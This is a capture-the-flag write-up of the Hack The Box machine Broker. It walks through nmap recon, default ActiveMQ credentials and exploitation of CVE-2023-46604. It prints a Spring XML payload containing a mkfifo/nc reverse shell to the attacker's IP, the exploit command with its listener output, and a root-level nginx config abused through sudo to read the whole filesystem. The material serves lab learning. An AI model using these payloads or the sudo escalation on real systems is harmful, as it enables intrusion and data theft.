---
title: 'HTB - Broker'
publishedAt: '2024-03-17'
description: 'Write-up of the Hack The Box machine Broker'
tags:
  - security
  - write-up
  - hackthebox
---

*Broker* is an easy and retired Hack The Box machine.
It explores a relative current RCE vulnerability in [ActiveMQ](https://activemq.apache.org/) and how unrestricted access to [nginx](https://nginx.org/en/) can be exploited to get access to the entire file system.


# System Recon
## Service Discovery
Discovering services with `nmap`.
```bash
$ sudo nmap -p- -oA scans/all-ports-tcp -iL hosts -sS -T3 --min-rate 1000
```

Also scan *UDP*.
But limit to top 1000 ports.

```bash
$ sudo nmap -iL hosts -sU --top-ports 1000 -oA scans/top-1000-udp -T3 --min-rate 1000
```

Nmap scan discovered the following `TCP` services:
- 22
- 80
- 1883
- 5672
- 8161
- 45615
- 61613
- 61614
- 61616


The *UDP* scan could not identify any open ports.
Nmap result was
```
PORT      STATE  SERVICE
1485/udp  closed lansource
4008/udp  closed netcheque
5555/udp  closed rplay
18373/udp closed unknown
21405/udp closed unknown
57958/udp closed unknown
```

## Service Information Gathering
Gathering information about services using `nmap`.

```bash
$ sudo nmap -oA scans/found-tcp-service-info -p 22,80,1883,5672,8161,45615,61613,61614,61616 -iL hosts -sS -sV -sC
```

<details><summary>Raw Result</summary>

```

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
45615/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```

</details>

Following table lists all ports and their identified listening services.

| Port | Service | Info |
| ---- | ------- | ---- |
| 22 | OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | **Probably not important for the first step** |
| 80 | nginx 1.18.0 (Ubuntu) | Requires basic auth |
| 1883 | mqtt | Topics and their most recent payloads: <br>ActiveMQ/Advisory/Consumer/Topic/# |
| 5672 | amqp? | Nmap isn't sure about this serivce |
| 8161 | http (Jetty 9.4.39.v20210325) | Requires basic auth |
| 45615 | tcpwrapped (Unknowm) | Nmap cannot identify this |
| 61613 | stomp (Apache ActiveMQ) |  |
| 61614 | http (Jetty 9.4.39.v20210325) | Empty page |
| 61616 | apachemq (ActiveMQ OpenWire transport) |  |

Lots and lots of HTTP servers running that, based on `nmaps` result, reveal files and directories.


# Service Recon

## HTTP (80/TCP)
Running http server on port 80, but it requires basic-auth authentication.

As a first try I entered the default credentials `admin:admin` and it worked.
**It's an ActiveMq admin panel.**

![Screenshot of the ActiveMq admin panel](./activemq-admin.webp)
*I failed to create a screenshot of the admin panel when I was working on this machine. I yoinked the screenshot from [0xdf's](https://0xdf.gitlab.io/) [write-up](https://0xdf.gitlab.io/2023/11/09/htb-broker.html#).*

The admin panel discloses that it runs ActiveMq version: **5.15.15**.
A quick search for ActiveMQ version 5.15.15 reveals that it is vulnerable to a pretty serious RCE vulnerability: https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/.

# Gaining User Access
## ActiveMq RCE
As explained previously, the used version of ActiveMQ is affected by an [RCE vulnerability](https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/).
I found the following POC: https://github.com/X1r0z/ActiveMQ-RCE/blob/main/README-en.md

Before we can use the POC we must first modify the payload.
Let's let it start a reverse shell.
Looking at the POC, we must modify the file `poc.xml`

Originally it contains the following payload:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>open</value>
                <value>-a</value>
                <value>calculator</value>
                <!-- <value>bash</value>
                <value>-c</value>
                <value>touch /tmp/success</value> -->
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Before actually setting up the reverse shell, let's first test if we actually receive a callback.

For this, we'll setup a small http server and see if it is pinged.
Setup a http server on your local device (for example with python http.server) to detect any incoming request
```bash
python -m http.server
```

Now, send the exploit and change the spring xml url.
```bash
$ ./ActiveMQ-RCE -i 10.10.11.243 -u http://10.10.14.44:8000/poc.xml
```

If the server is vulnerable you should observe an incoming request on the local http server's log like so
```
$ python -m http.server               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.243 - - [21/Jan/2024 11:04:24] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [21/Jan/2024 11:04:24] "GET /poc.xml HTTP/1.1" 200 -
```

Now that we validated it, let's actually setup the reverse shell.
First, change the POC payload to start the reverse shell.
*Had to experiment a little bit with esaping characters such as `>`.*
```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
	            <value>bash</value>
	            <value>-c</value>
	            <value>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.44 9999 &gt;/tmp/f</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Then, we must setup our listener.
I like to use [pwncat-cs](https://github.com/calebstewart/pwncat) by [Caleb Stewart](https://github.com/calebstewart).
```
$ pwncat-cs --port 9999 --platform linux
[11:16:26] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
[11:25:15] received connection from 10.10.11.243:59064                                                                                            bind.py:84
[11:25:17] 0.0.0.0:9999: upgrading from /usr/bin/dash to /usr/bin/bash                                                                        manager.py:957
[11:25:21] 10.10.11.243:59064: registered new host w/ db                       
(remote) activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```

Perfect, we have a working reverse shell.

## User Flag
Since we already have user access with the [ActiveMq RCE](#activemq-rce), we already have the required permissions to just read the user flag.

Navigate to `/home/activemq` and read file `user.txt`, and :tada: you got the user flag.

We could use the user access to gain a more permanent access without exploiting the vulnerability.
However, since the vulnerability is very easy to perform, we won't do it.

# System Recon
Next, recon the system to find possible privilege escalation vectors.

## Linpeas
Enumerate the system with linpeas.
Uploaded to `/tmp/linpeas.sh`
Also logging it into a file to download it later.
```
./linpeas.sh | tee linpeas.log
```

What immediately stands out is that the user is allowed to run nginx with sudo privileges without any command.
While it might not give us complete control over the root owner, we can use this to read the root flag.

*After completing the challenge I looked at other write-ups to see if they did anything different. I saw that we could actually exploit this to gain full root access. I won't explain it here but if you're interested I can highly recommend looking at the official write-up.*

# :tada: Root Flag
Since we can run nginx with sudo, we can create a new configuration that runs nginx with the root user and gives us read access to all files on the server.

I copied the default config (at `/etc/nginx/nginx.conf`) to `/tmp/nginx.conf` and modified it slightly.
```diff
- user www-data;
+ user root;
  worker_processes auto;
  pid /run/nginx.pid;
  include /etc/nginx/modules-enabled/*.conf;
  
  # Truncated for brevity [...]
  
  http {
  
	  # Truncated for brevity [...]
  	
	  ##
	  # Virtual Host Configs
	  ##
  
	  include /etc/nginx/conf.d/*.conf;
-     include /etc/nginx/site-enabled/*;
  
+	  server {
+		  listen 4444;
+		  autoindex on;
+  
+		  root /;
+	  }
  }

  # Truncated before brevity [...]
```

This configuration will start nginx with the root user and creates a server listening on port 4444 with the root set to the root path.
The setting `autoindex on` let's us browse the directory contents.
I added this just for convenience.

We can start the it with the following command:
```
sudo nginx -c /tmp/nginx
```

Now, we can browse the entire filesystem by going to `http://10.10.11.243:4444`
Navigate to the root folder, read the root flag, and :tada: the machine is done.